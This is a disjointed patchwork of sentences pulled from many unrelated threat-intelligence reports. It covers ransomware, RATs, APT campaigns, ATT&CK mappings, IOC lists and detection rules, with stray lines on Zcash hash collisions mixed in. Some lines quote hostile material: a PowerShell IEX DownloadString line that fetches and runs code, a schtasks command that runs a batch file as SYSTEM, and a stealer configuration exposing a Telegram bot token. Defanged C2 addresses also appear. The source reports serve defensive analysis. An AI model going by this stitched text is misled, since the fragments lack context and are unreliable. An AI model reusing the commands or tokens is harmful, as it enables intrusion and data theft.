It works as follows: The Hider encrypts the Orchestrator’s pages with a cipher based on XOR and ROL operations and assigns the PAGE_NOACCESS attribute to them When the Orchestrator accesses hidden pages, the operating system generates an ACCESS_VIOLATION exception The Hider detects the generated exception through the hook of the KiUserExceptionDispatcher function, which handles dispatching of all exceptions The hooked function decrypts the hidden page and assigns it the PAGE_EXECUTE_READWRITE attribute, thus handling the exception The Hider conceals the unhidden pages again within 30 seconds. 
Ensure there are unique and distinct administrative accounts for each set of administrative tasks. 
A Crimson RAT command dispatch routine Some Crimson RAT variants are stripped of debug information, whereas others have PDB paths that contain a date stamp, the word Richa, which relates to the configured C2 domain, and the word Wibemax.
Through this view we see that the following vhosts are active on the device. 
Some of the accounts used were not in the victim’s Active Directory, as these were accounts for customers of the victim and stored in a separate LDAP database.
Our graphic from a previous campaign explains the overlap, which can still be found in this most recent activity. 
Targets This attack primarily targets victims in Portugal, Mexico, and Peru.
The ransomware note sent out to the victim was formatted similarly to Yanluowang ransomware notes, although other variants dropped a note that more closely resembled DarkSide ransomware notes (causing some to mistakenly refer to it as DarkSide).
Due to the high-profile nature and steady stream of Black Basta attacks identified globally in 2022, the operators and/or affiliates behind the service likely will continue to attack and extort organizations. 
[1] Bleeping Computer: New DFSCoerce NTLM Relay attack allows Windows domain takeover APPENDIX: MITRE ATT&CK TACTICS AND TECHNIQUES See Table 3 for all referenced red team tactics and techniques in this advisory.
Figure 61.
Monitor for newly constructed scheduled jobs by enabling the Microsoft-Windows-TaskScheduler/Operational setting within the event logging service
A full list of Sagan Rules can be found on github.com/quadrantsec/sagan-rules Rule Name SID [CISCO-SECUREENDPOINT] Exploit attempt was detected 5008352 
In addition to those techniques, the actor employed a number of previously unseen techniques designed to to drop the defenses of the victim, inhibit monitoring, disable networking and allow time for the ransomware to finish encrypting files.
These are probably compromised devices that act as proxies for their C&C servers.
Around mid-April 2022, individual security researchers and cybersecurity media outlets reported a new development with REvil that could signify the gang’s return.
/Library/LaunchAgents/logind.plist The configuration of the logind agent.
T1074.001Data Staged: Local Data StagingFlowCloud stores collected data in local SQLite databases prior to exfiltration. 
The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters.
Ads displayed if the victim enabled the notifications in the phishing page. 
Cortex XDR: Identifies indicators associated with Black Basta. 
Figure 12.
This domain name has previously been attributed to Lazarus by multiple researchers. 
At the time of this analysis, X-Force was unable to retrieve the final payload from the servers as they have been taken down; therefore, it is uncertain whether these additional LNK files are related to ITG10 activity.
If features such as updates to circumvent the replacement of cracks or patches are disabled, users would then be putting their respective systems at greater risk of attacks or infections. 
Once a machine is infected by NotPetya, a series of malicious activities ensue, including the following: Dropped files Process hashes and process privilege checks Credential theft Token impersonation Malware propagation Network node enumeration SMB copy and remote execution SMBv1 exploitation via EternalBlue UNC write malware to admin$ on remote target Remote execution of the malware MBR ransomware Physical drive manipulation MFT encryption File encryption System shutdown Anti-forensics Ransomware instructions for file recovery occur after the infection process has completed.
One of them is the name of the next file that is going to be loaded.
Thanks for sharing @proxylife! 
When we run any executable in our sandbox environment that requires dependencies that are not present, we would see the same error.
This may indicate malware that is still in development, the work of a researcher, or targeted activity. 
Over C2 Channel;When the attackers use Cobalt Strike, the collected information may be sent via Cobalt Strike server communication channels. ;T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol;The attackers may use the ExMatter exfiltration tool, which sends stolen data to SFTP and WebDav resources specified in the ExMatter configuration. ;T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage;The attackers use the Rclone synchronization utility to upload stolen data to the legitimate cloud storage service MEGA. ;T1020 Automated Exfiltration;After access has been gained, files from target hosts are automatically uploaded to the legitimate cloud storage service MEGA using the Rclone utility. 
As with the previous example, “TaxReturn2022.pdf.lnk” has a PDF icon.
WORKSTATION Rundll32: C:\Windows\System32\rundll32.exe C:\Windows\Microsoft.
Vice Society active leak site mirror (Oct. 20).On Oct. 25, the original .onion address became active again.
Then, the ‘OffSec’ class is instantiated in the main program routine so it gets loaded in memory along with its methods. 
T1112Modify RegistryThe attackers have used RATs that allow full access to the Registry, for example to clear traces of their activities. 
As LATAM is an up-and-coming region whose security posture is not as sophisticated or developed as some other regions for various reasons (geopolitical circumstances and developing infrastructure, among others), threat actors may view LATAM entities as easy targets for harvesting sensitive and financially lucrative accounts via infostealer infections.
S1074 ANDROMEDA
This enables the attacker’s BAT file to run in a new elevated process without the user’s approval. 
However, evidence suggests that it has been in development since February.
Mandiant has also observed at least one actor associated with CLOP recently seeking partners to work on SQL injections.
eSentire Threat Intelligence Malware Analysis BatLoader
The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration.
We think the gap between the two updates allows the attackers to plan their operations accordingly. 
It relies on two additional scripts to configure the I2P network tooling and download the XMRig mining software. 
Indicators of CompromiseFiles1680478346389.zipMD5: 9e6c45b6b8b20bf3c5959dbba8f27117LiveUpdate360.datMD5: f149d3f3ef0361ebe4d346811f29b527LiveUpdate.exeMD5: 96e4b47a136910d6f588b40d872e7f9dsetting.iniMD5: 91aab4bbe634be62d11d132738c23a82SqlVersion9.dllMD5: 317f9ff06c076e87e5b1d11242396d5fú¿╡τ-╫╙-╖ó-╞▒ú⌐.exeMD5: 4723a2a8f68c1eaf82809cff29b8e56fURLshxxps://api[.]youkesdt[.]asia/admin/down/hash/79b7c6ed-c4d8-4b36-b1cd-f968e6570010hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/SqlVersion9[.]dllhxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/Media[.]xmlhxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/LiveUpdate360[.]dathxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/LiveUpdate[.]exehxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/223[.]114[.]txtCommand and Controlhxxp://61[.]160[.]223[.]114:18076All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks.
Remote Desktop Protocol The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system Initial Access, Persistence T1078.004: Valid Accounts: Cloud Accounts The threat actor used accounts with Delegated Administrator rights to access other O365 tenants.
In practice, the desired output may be a field element, in which case a single coordinate of the resulting point is often used as the hash.\n
It was possible to configure an alternate phone number for the logged in user account at the company portal.
We have previously provided guidance and remediation steps to help ensure that customers are empowered to address this threat.
Let’s try on VirusTotal Not bad ! 
As a command line argument, the Rijndael decryption key is passed.
The writeups conducted by "Northwave-Security" and "Deepinstinct" share more light onto these flags.
x64dbg – reliable and user-friendly.
It becomes clear that IronNetInjector is mostly used to load ComRAT.
It’s designed to convert Python code into highly optimized C/C++ code, which is then compiled into native machine code.
MITRE ATT&CK Tactic ID Name Resource Development T1583.004 Acquire Infrastructure: Server T1587.001 Develop Capabilities: Malware T1585.002 Establish Accounts: Email Accounts T1588.002 Obtain Capabilities: Tool T1608.001 Stage Capabilities:
cmd ani adv msi msp com nls ocx mpa cpl mod hta prf rtp rdp bin shs wpx bat rom msc spl ics key exe dll ... restore-my-files.txt ... winmd ntldr ntuser.dat.log bootsect.bak autorun.inf thumbs.db iconcache.db Also interesting are the strings related to Windows artifacts (e.g. autorun.inf, ntuser.dat.log, etc…).
In the below section we will discuss Exception types and implementation. 
Look for additional findings on this blog and the Eclypsium Platform for your organization. 
Historically, npm has been the unfortunate leader and PyPI an also-ran in the race to see which open-source platform attracts the most attention from malware authors.
StageLoaderFinal PayloadObfuscationMain
Figure 19.
[T1110.002]Brute Force: Password
S0653 xCaon
Infostealer dll Cad1120d91b812acafef7175f949dd1b09c6c21a 7faea2b01796b80d180399040bb69835 GitHub Repository raw[.]githubusercontent[.]com/IconStorages/images/main/ C2s akamaicontainer[.]com akamaitechcloudservices[.]com azuredeploystore[.]com azureonlinecloud[.]com azureonlinestorage[.]com dunamistrd[.]com glcloudservice[.]com journalide[.]org msedgepackageinfo[.]com msstorageazure[.]com msstorageboxes[.]com officeaddons[.]com officestoragebox[.]com pbxcloudeservices[.]com pbxphonenetwork[.]com pbxsources[.]com qwepoi123098[.]com sbmsa[.]wiki sourceslabs[.]com visualstudiofactory[.]com zacharryblogs[.]com Icon File Hashes a541e5fc421c358e0a2b07bf4771e897fb5a617998aa4876e0e1baa5fbb8e25c d459aa0a63140ccc647e9026bfd1fccd4c310c262a88896c57bbe3b6456bd090 d51a790d187439ce030cf763237e992e9196e9aa41797a94956681b6279d1b9a 4e08e4ffc699e0a1de4a5225a0b4920933fbb9cf123cde33e1674fde6d61444f 8c0b7d90f14c55d4f1d0f17e0242efd78fd4ed0c344ac6469611ec72defa6b2d f47c883f59a4802514c57680de3f41f690871e26f250c6e890651ba71027e4d3 2c9957ea04d033d68b769f333a48e228c32bcf26bd98e51310efd48e80c1789f 268d4e399dbbb42ee1cd64d0da72c57214ac987efbb509c46cc57ea6b214beca c62dce8a77d777774e059cf1720d77c47b97d97c3b0cf43ade5d96bf724639bd c13d49ed325dec9551906bafb6de9ec947e5ff936e7e40877feb2ba4bb176396 f1bf4078141d7ccb4f82e3f4f1c3571ee6dd79b5335eb0e0464f877e6e6e3182 2487b4e3c950d56fb15316245b3c51fbd70717838f6f82f32db2efcc4d9da6de e059c8c8b01d6f3af32257fc2b6fe188d5f4359c308b3684b1e0db2071c3425c d0f1984b4fe896d0024533510ce22d71e05b20bad74d53fae158dc752a65782e Contributors Travis Smith, Vice President, Threat Research Unit, Qualys Irfan Asrar, Director, Malware and Threat Research, Qualys Mayuresh Dani, Manager, Threat Research.
The threat actor kept the remote desktop session alive by running a program to keep the session active (dontsleep.exe) Detections Network The DFIR Report Cobalt Strike 139.60.160.18The DFIR Report Cobalt Strike 139.60.161.167 ET Threatview.io High Confidence Cobalt Strike C2 IP group 1 ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SMB Executable File Transfer ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET INFO Observed External IP Lookup Domain (icanhazip .com
Consequently, differentiating between the legitimate and malicious use of Windows’ internal tools and services becomes a high priority for enterprise networks. 
EclecticIQ researchers observed that the threat actor used the Windows command-line arguments to perform general reconnaissance against infected devices.
Acknowledgments Sophos X-Ops wishes to acknowledge the contributions of Colin Cowie and Benjamin Sollman of the MDR intelligence team, Sivagnanam Gn, Anand Ajjan, and Anisha Kumar of SophosLabs, and Sales Engineer Matthew Haltom to our understanding of this threat and its impacts. 
BlackCat utilizes a unique onion domain with a victim-specific access key for the victim to use to learn more about the attack, their data, and what the threat actors want the victim to do next.
Block 1 is responsible for reading/writing registry keys under “HKEY_CURRENT_USER\SOFTWARE\<script-specific name>”.
September 2020 – Operation Quicksand – Israel: According to ClearSky, MuddyWater targeted many prominent Israeli organizations.
Toy Example: Collisions Since the subgroup order is 139, adding this quantity (or multiples of it) to the scalar factors of the linear combination performed by the Pedersen hash function results in the same hash output.
That being said, the version installed by the Balada attackers is spurious and a maliciously modified version, in which hackers disabled the legitimate functionality and added malicious code to be executed instead.
ESET researchers have documented and analyzed TA410 activity going back to 2019.
Both API calls have to be called into a remote process. 
B PCHunter bb48f5c915ab7bbbbbf092a20169aaf3ced46b492ed69550854a55254ce10572 Backdoor.
We named this malware “NUPAKAGE," a name derived from its unique PDB string, D:\Project\NEW_PACKAGE_FILE\Release\NEW_PACKAGE_FILE.pdb. 
The diversity of protocols and techniques would seem to protect the backdoor from network traffic inspection. 
Detecting post-exploitation activity Alerts with the following titles may indicate post-exploitation threat activity related to MERCURY activity described in this blog and should be immediately investigated and remediated.
The malware attempts to gather a list of known TCP endpoints and IP addresses to check whether it can connect to the IPs via SMB ports 445 and 139.
G1004 LAPSUS$
"reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s >>
10”.
S0469 ABK
Exploiting vulnerabilities allowed the attackers to obtain Initial Access inside all types of networks, where the bot would search for Modbus traffic to identify infected systems with Industrial Control Systems (ICS). 
The base64 decoded batch file is shown in Figure 23. 
TA0002 Execution;T1106 Native API;BlackCat ransomware uses Native API. ;
[WINDOWS-CLIPBOARD] net commands 5008373 [WINDOWS-CLIPBOARD] net commands 5008374 [WINDOWS-CLIPBOARD] query user command 5008375 
S1078 RotaJakiro
This new RAT is a modified branch of the open-source version, adding some modifications features to the original RAT.
However, given the nature of the tools, it is possible that the actors intended to use them to facilitate the exfiltration of email data from compromises mailboxes.
This gives the attacker the ability to gain more insight into the targeted network. Figure 16.
The threat actor installed a second stage persistence backdoor on infected device by abusing Windows Services.
LOG1ntuser.dat.
Conclusions In this publication, we discussed the changes made to the second wave of ransomware and wiper samples that targeted Albanian institutions to evade detection and inflict maximum damage. 
The mw_resolveAPI function first finds the specific index, jumps to it, and decrypts the corresponding library name value as shown in the bottom image of Figure 9. Figure 9.
Standard encryption in FunnySwitch HTTP with long polling There are three types of requests: GET "connect", GET "pull", and POST "push".
According to WHOIS records for the domain tributaria[.]website, used in this campaign to host the attacker’s tools as well as exfiltrated data, the domain was registered in July 2022 and the registrant was based out of Brazil.
The mechanism described here is similar to the methods used by other UEFI firmware implants such as LoJax, MosiacRegressor, MoonBounce, and Vector-EDK, referenced previously. 
"%%i"') do @echo
An overview of a typical attack is shown in Figure 1.
However, in 2015, a new code-reuse technique named Counterfeit Object-Oriented Programming (COOP) has been formulated in a paper which seemed quite promising in defeating Control-Flow Integrity (CFI) defenses. 
Interop.
IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:39303/%27); Invoke-ShareFinder -CheckShareAccess -Verbose
Using a similar tunnel setup described above, the team attempted to log into SBS 2.
Although many other rulesets are used to screen for malicious activity, Quadrant has custom rules in place to detect SSH over nonstandard ports, such as TCP 2222.
This serves as a reminder for defenders for defence in depth and the need to anticipate different tactics that threat actors may use. 
In 2021 and 2022, Vice Society used Zeppelin to target Windows hosts. 
POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI.
MacOS systems used a different infection chain leveraging a hardcoded C2 domain, as opposed to the GitHub repo.
Comparing the properties of the malicious file (left), and properties of the legitimate Youdu installer (right) 
Safari/537.36 The expected result from the server is a JSON with the following structure: {"msg":"[BASE64-ENCODED COMMAND]"} After the validation of the JSON and Base64 decoding, the malware creates a Goroutine that executes the command and continues to listen for more commands in a loop. 
[T1071.002].
Disable inactive accounts uniformly across the AD, MFA systems, etc. 
Anonymous IP address. 
Threat researchers reported similar campaigns in the past targeting Mexico. 
T1059.001 Command and Scripting Interpreter:
Once infected, the ielowutil.exe binary constantly attempts to contact its command–and-control server, on 64.44.101.171:9191.
Targets have included shipping information, sea vessel movements, border and immigration control, export-related government agencies, food production, and humanitarian groups.
The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.
Using the method described above, our researchers downloaded files with ID Nos. 1-18.
| | 190.114.254.116 | /push | | 190.114.254.116 | /__utm.gif | | kaslose.com | /jquery-3.3.1.min.js | | yawero.com | /skin.js | | sazoya.com | /skin.js | | 192.198.86.130 | /skin.js | | 162.244.83.216 | /jquery-3.3.1.min.js | | sammitng.com | /jquery-3.3.1.min.js | | 23.19.227.147 | /styles.html 
except: exit('[-]
Supporting and encouraging younger individuals to seek an education and training within the cyber realm can drastically affect the skills shortage and improve public awareness on cyber threats; the region has been particularly affected by cybercrime and fraud during the pandemic.
Calling a method from the .NET
Messages are parsed and handled according to their content.
SteganographyThe attackers have used packers that read pixel data from images contained in PE files’ resource sections and build the next layer of execution from the data. 
These discovery actions were completed several times again in other various batch files. 
This is a PowerPoint file (PPT) containing two slides with the same content, the first one written in English and the second in French.
Exfiltration
Brazilian cybercriminals have successfully launched replay attacks since at least 2014.
This campaign did not support stopping or restarting the Telnet propagation, and while the samples support the same commands, their associated IDs did not match. 
This threat actor abused access to accounts in the Cloud Solution Partner’s environment with legitimate delegated administrative privileges to then gain access to several customers’ O365 environments. 
The installer shellcode follows these main objectives: Download and deploy a Python interpreter Generate and deploy a loading chain with its payload Ensure persistence of the loading chain 
Key points of this blogpost: Agrius conducted a supply-chain attack abusing an Israeli software suite used in the diamond industry. 
The OneNote contained aHTA file that once executed would make use of the curl utility to download Qakbot and then execute it. 
Unfortunately, there are some edge cases where organizations have had their files encrypted within just 24 hours, and that type of threat really does require an experienced, global partner, such as Sophos, to augment your security program. 
The Virtual File System component The Virtual File System is the place where all the plugin executables and their configurations hide.
Windows Defender tampering On one host, the threat actors ran the following command to try and clear the way for their activity, likely due to the difficulty the threat actors were having with beacons crashing. 
The execution of pc.exe requires a password supplied by the operator (in this case, P2sSW0rd1234!@#$C), which the operator provides through the key command-line parameter. 
When the executable is run, the threat actor is prompted for a password to continue.
Use VPN to access the network, instead of exposing RDP to the Internet.
More information on this service and others can be found here. 
We also found they compromise the domain controller in the victim’s environment and deployed Cobalt Strike on their hosts by creating immediate tasks through GPO.
The team could not take advantage of the open SSH socket.
The team also used the asktgt command to impersonate accounts they had credentials for by requesting account TGTs [T1550.003]. 
Unix is a registered trademark of The Open Group.
For this reason, in addition to destroying the data, many wipers first destroy two special files in the system: The Master Boot Record (MBR), which is used during the boot process to identify where the Operative System is stored in the disk.
Akira Ransomware is bringin 1988 back
[T1562.004], Deobfuscate/Decode Files or Information
Image credit: cobaltstrike.com Some of the cases we have observed threat actors using reverse proxy are: Diavol Ransomware BazarLoader and the Conti Leaks Snatch Ransomware 
The URLs use the following format www.%domain%[.]com/?%rand%, where %domain% is randomly chosen from google, bing and yahoo and %rand% is a random 32-bit unsigned integer represented in ASCII. 
B868764C46BADC152667E9128375BA4F8D936559qrt.dll.usbN/AKorplug encrypted payload. 
The earliest variant of ShellFang was observed in a victim’s environment in 2020.
A lot of the (in-depth) technical indicators and techniques match.
The campaign lasted less than three hours and within that timeframe ESET customers were already protected with detections identifying Fantasy as a wiper, and blocking its execution.
The malware requires elevated privileges for the subsequent stage payload, which involves loading the malicious driver by exploiting CVE-2015-2291. 
S0487 Kessel
This very complex backdoor contains interesting espionage capabilities.
Figure 3.
However, to add an extra layer of complexity and challenge for malware analysts, we will apply some obfuscation techniques using a helpful tool like Chameleon: https://github.com/klezVirus/chameleon This tool has been developed as a Python port of the Chimera project, by tokioneon_. 
If found, some of that data was sent back to the attacker. 
Reconfiguring the default boot behavior to safeboot minimal and then executing a reboot unloads all but the bare minimum for the Windows operating system.
A sophisticated group of cybercrime actors is luring victims, via phishing emails, with a traffic infringement phishing scheme to download TrickBot. 
T1027
K!tr.ransom The FortiGuard Antivirus service engine is included in Fortinet’s FortiGate, FortiMail, FortiClient, and FortiEDR solutions. 
Here are some additional recommendations to prevent the risks of infection from malware types like ViperSoftX: Download software and applications from official platforms and sources. 
Emotet Strikes Again  LNK File Leads to Domain Wide Ransomware  The DFIR Report
LegalNoticeCaption /t
Code for the brute forcing implementation is significantly more structured than typical IoT malware that copies and pastes code with minimal modifications. 
Engima Stealer initialization The malware configuration is as follows: public static string Version = "0.05.01"; public static string DebugMode = "0"; public static string Mutex = "6C0560CE-2E75-4BB4-A26E-F08592A1D56D"; public static string AntiAnalysis = "0"; public static string Autorun = "1"; public static string StartDelay = "0"; public static string WebcamScreenshot = "1"; public static string KeyloggerModule = "0"; public static string ClipperModule = "0"; public static string GrabberModule = "0"; public static string TelegramToken = "5894962737:AAHAFZnz2AkLAyHC0G-7S2je9JMWWLJHGsU"; public static string TelegramChatID = "5661436914"; It then starts to collect system information and steals user information, tokens, and passwords from various web browsers and applications such as Google Chrome, Microsoft Edge, Microsoft Outlook, Telegram, Signal, OpenVPN and others.
This is described in Section 5.4.9.4 of the Zcash protocol specification [Zcash], where Lemma 5.4.7 shows that if a given point P = (u, v) is on the curve, then (u, -v) is not on the curve, thereby preventing the potential issue outlined.\n
A successful intrusion creates liabilities and may harm an organization’s reputation, especially those responsible for delivering services to others such as critical infrastructure providers, which Mint Sandstorm has targeted in the past. 
This attack occurs by:Installing malware, such as a trojan horse, on the victim’s computer to incorrectly resolve DNS queries and lead the unsuspecting user to malicious sitesCompromising the target router and changing its DNS settings.
Close(); #waiting remote [System.Net.
Investigating the traffic from our samples, we observed the check-in-signature (“20 2A 2F 2A 0D”) that is typical for PlugX network traffic: 00000000: 47 45 54 20 2F 42 34 42 42 44 43 43 30 32 39 45 00000010: 
And a Win32 binary called CSStub2.$sxr-nircmd.exe, which corresponds to the unmodified command-line utility NirCmd. 
Harden: Software Update [D3-SU] Detect: Network Traffic Analysis Connection Attempt Analysis
Operation CMDStealer Network Infrastructure The phishing and C2 (command and control) infrastructure are hosted on services with numerous domains associated with a single address, including fast flux services.
The Windows User Access Logging (UAL) database is an extremely powerful artifact that has played an instrumental role in the investigation of StellarParticle-linked cases.
" } Class m Method
Figure 2: WindowsParentalControlsMigration
All of the above-mentioned evasion techniques and payload execution sequences are already explained in detail in SonicWall Capture Labs Research team’s blog. 
Lizar Loader also generates a system ID which consists of a hash of system data followed by the current process ID, however, it uses a CRC algorithm to create its hash. 
Afterward, it uses the schtasks.exe command to register the file to the task scheduler with the name OneDriveOp to connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.
When a file has a low number of imports, it strongly indicates that it contains another component that is dropped/loaded.
Example of a TZW variant GlobeImposter ransom note. 
When an IronPython script is run, the .NET injector gets loaded, which in turn injects the payload(s) into its own or a remote process. 
Impact Incident #1 C:\ProgramData\Update.bat file executed the ransomware binary dllhost32.exe, which is detected as Troj/Ransom-GWA by Sophos (Figure 4) 
Windows Command Shell T1053 Scheduled Task/Job: Scheduled Task T1047 Windows Management Instrumentation Persistence T1547 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1574 Hijack Execution Flow: DLL Search Order Hijacking T1053 Scheduled Task/Job: Scheduled Task T1078 Valid Accounts: Domain Accounts T1078 Valid Accounts: Default Accounts Privilege Escalation T1068 Exploitation for Privilege Escalation Defense Evasion T1140 Deobfuscate/Decode Files or Information T1070 Indicator Removal on Host: Clear Windows Event Logs T1070 Indicator Removal on Host: File Deletion T1070 Indicator Removal on Host: Timestomp Credential Access T1003 OS Credential Dumping: LSASS Memory Discovery T1087 Account Discovery: Domain Account T1082 System Information Discovery T1049 System Network Connections Discovery Lateral Movement T1210 Exploitation of Remote Services T1570 Lateral Tool Transfer T1021 Remote Services: SMB/Windows Admin Shares Collection T1560 Archive Collected Data: Archive via Utility T1005 Data from Local System T1119 Automated Collection T1039 Data from Network Shared Drive Command and Control T1071 Application Layer Protocol: Web Protocols T1132 Data Encoding: Standard Encoding T1573 Encrypted Channel:
Given the hardline consensus among policymakers in Tehran and sanctions previously levied on Iran’s security organizations, Mint Sandstorm subgroups may be less constrained in carrying out malicious cyber activity. 
The helper shows two simple use-cases but this can be of course expanded to invoke any CFG-allowed API (if the application is compiled with it). 
The documents distributed by Transparent Tribe typically display an image (a “View Document” graphic) indicating that the document content is locked.
Code for injecting shellcode into a running processThe injectors contain typical code that obtains SeDebugPrivilege, finds the PID of the target process, and injects shellcode into it.
Besides its capability to perform a jackpot, the malware was also capable of capturing information from magnetic strips on credit and debit cards inserted into the infected ATMs.
In line with other ScarCruft tools, Dolphin abuses cloud storage services – specifically Google Drive – for C&C communication. 
Ransom Cartel TOR site landing page.
Active Scanning: Scanning IP Blocks The threat actor probed external services in an attempt to regain access to the environment Indicators of Compromise (IOCs) Indicator Details http://satkas.waw[.]pl/rainloop/forecast TrailBlazer C2 1326932d63485e299ba8e03bfcd23057f7897c3ae0d26ed1235c4fb108adb105 TrailBlazer SHA256 vm-srv-1.gel.ulaval.ca GoldMax C2 2a3b660e19b56dad92ba45dd164d300e9bd9c3b17736004878f45ee23a0177ac GoldMax SHA256 156.96.46.116 TA Infrastructure 188.34.185.85 TA Infrastructure 212.103.61.74 TA Infrastructure 192.154.224.126 TA Infrastructure 23.29.115.180 TA Infrastructure 104.237.218.74 TA Infrastructure 23.82.128.144 TA Infrastructure Additional Resources Read about the latest trends in threat hunting and more in the 2021 Threat Hunting Report or simply download the report now. Learn more about Falcon OverWatch proactive managed threat hunting. 
G0088 TEMP.Veles
Following the technical information, we will demonstrate two hands-on analyses of packed malware. 
Depending on its configuration, these checks may be executed or not. 
It was part of several successful attacks against a large variety of industries, including critical infrastructure. 
For instance, immediately after execution, it loads itself in memory, and deletes itself from the disk.
HackTool:Win32/NamedPipeImpers.
S0250 Koadic
[TA0005] and Credential Access
We observed APT36 introducing OLE embedding to its typically used techniques for staging malware from lure documents and versioned changes to the implementation of Crimson RAT, indicating the ongoing evolution of APT36’s tactics and malware arsenal. 
Decompiled session secret generation procedure.
That being said, sometimes website owners can be hesitant to issue all available plugin and theme updates due to concerns about compatibility issues or breaking something, so for this reason it’s also a good idea to place your website behind a firewall to prevent attacks.
These are direct checks for type and size of physical RAM, type and size of physical hard disks, and checking for odd or anomalous combinations of processors and cores. 
If the API fails to execute, the malware calls InitiateSystemShutdownExW with the flag set to reboot the machine. 
Additionally, we believe the victims were already using PsExec, and Agrius operators chose to use PsExec to blend into typical administrative activity on the victims’ machines, and for ease of batch file execution.
[T1095] Web Service: Dead Drop Resolver [T1102.001] Web Service:
These detections were driven by heuristic detection methods, which play an important role in detecting new, previously-unknown supply chain threats, where legitimate third-party technology products or updates have been compromised.
The attack was reported in late March 2023 and is an ongoing investigation. 
36 and 38ClientTransfer file to server in message body. 
At the end of February, Proofpoint’s researchers observed a low-volume campaign distributing IcedID “Forked” via fake notices from the National Traffic and Motor Vehicle Safety Act and the U.S. Food and Drug Administration (FDA). 
Conclusion Our analysis of Rorschach reveals the emergence of a new ransomware strain in the crimeware landscape.
WMI Consumers specify an action to be performed, including executing a command, running a script, adding an entry to a log, or sending an email.
This naming convention is similar to the one used at the same time by the MQsTTang backdoor versions discovered by ESET and found in VT.
This means, that without an exploit or user-approval users files will remain protected. 
JavaScript [T1059.007]). 
The malware samples also communicate with other known C&C servers attributed to Camaro Dragon. 
Another remaining unknown is ModPipe’s distribution method.
LockBit encryption comparative table | Source:
This malware provides a set of functionalities to perform various malicious activities on a victim’s computer.
BusinessLayer.
According to the promotional material, the LummaC2 is approximately 150-200 KB and can affect operating systems from Windows 7 to Windows 11. 
"SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00 
It allows the user to collect useful statistics related to accounts and passwords.
As the previous section mentioned, the IP address 199.19.226[.]117 also resolves to the known TeamTNT domain zzhrecieve.anondns[.]net. Figure 12.
Exfiltration Over C2 Channel
GTSC simulates case 0 with the image below.
IoCs provide you with file hashes and network indicators such as URLs, and IP addresses being contacted through irregular ports.
Implementing a rigorous configuration and patch management program will hamper sophisticated cyber threat actors’ operations and protect organizations’ resources and information systems. 
One of those reports was published in February 2019, by QiAnXin researchers.
Lateral Tool Transfer Trigona operators use Splashtop to transfer malicious tools from computer to computer in the victim’s environment. 
2. 
Crucially, this process can also lead to collisions.
Cloud exfil tool and exfil to OneDrive.
%x] with length %ystopTheWorld: not stopped (status !
FlowCloud can also gather information about things happening around the victim’s computer by taking pictures using connected camera peripherals and recording audio using a computer’s microphone.
URLNote that the document is editable without logging in.
Another round of activity took place using system tools, batch files, and Adget.
This was observed on both the beachhead host and a domain controller. 
Ensure your backup data is not already infected.
In this case, dynamic debugging can be very helpful – debuggers like x64dbg let you put a breakpoint on function calls, even if the function is not imported.
To have some minimal form of obfuscation from prying eyes, the strings in the backdoor are compressed and encoded in Base64, or their hashes are used instead. 
They then used forged credentials to move to multiple hosts across different sites in the environment and eventually gained root access to all workstations connected to the organization’s mobile device management (MDM) server.
Its purpose remains unclear. 
Figure 2.
The default configuration allows unprivileged users to query group membership of local administrator groups.
S1102 Pcexter
S0115 Crimson
T1587.001Develop Capabilities: MalwareCustom tools from the attack are very likely developed by the attackers. 
The following screenshot shows one of the IronPython scripts decoded: Figure 1.
We have notified the victim about the malicious GoBruteforcer binaries hosted on their site. Figure 2.
Passcode check routine in NUPAKAGE SHA256 Passcode 634977a24e8fb2e3e82a0cddfe8d007375d387415eb131cce74ca03e0e93565f notebook c835577f1ddf66a957dd0f92599f45cb67e7f3ea4e073a98df962fc3d9a3fbe0 comeon 2937580b16e70f82e27cfbc3524c2661340b8814794cc15cb0d534f5312db0e0 update c2f5a12ebaeb39d4861e4c3b35253e68e6d5dc78f8598d74bc85db21aeb504e8 comeon Table 4.
Finally, the malware jumps to the entry point of the newly injected PE with the original command-line arguments. 
As with the attack mentioned previously, these link files are disguised as PDF files to fool potential victims into opening them. 
The backdoor: rescure.dat A decoy DLL: sspisrvui.dat as sspisrvui.dll (timestomped to July 2013) 
.sdf .sh .sitx .sln .sql .srt .svg .swf .swift .tar .tar.gz .tax2014 .tax2015 .tex .tga .thm .tif .tiff .tmp .toast .torrent .txt .vb .vcd .vcf .vcxproj .vob .wav .wma 
The variants Tohnichi (active in 2021), Mallox, and Fargo (both active in 2022) targeted vulnerabilities in Microsoft SQL (MS SQL) Server for initial access.
T1585.003Establish Accounts: Cloud AccountsThe attackers acquired accounts in Alibaba Cloud Object Storage Service to host their malicious MSI installers. 
The RAR file contains a batch file with a CMD extension that is executed when the victim opens the contents of the file.
G0121 Sidewinder
Figure 7 – Lockbit’s Ransom note We recommend referring to our previous blog post to comprehensively examine LockBit 2.0 and Lockbit 3.0 ransomware. 
Service Execution [T1569.002] Persistence [TA0003] Boot or Logon Initialization Scripts: Logon Script (Windows)
S0344 Azorult
Figure 57.
During our tests we observed two ways of encoding.
The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory. 
When malware is running without debugger exception EXCEPTION_BREAKPOINT is raised, and control is transferred to the Vectored Exception Handler. 
Enable and enforce multifactor authentication. 
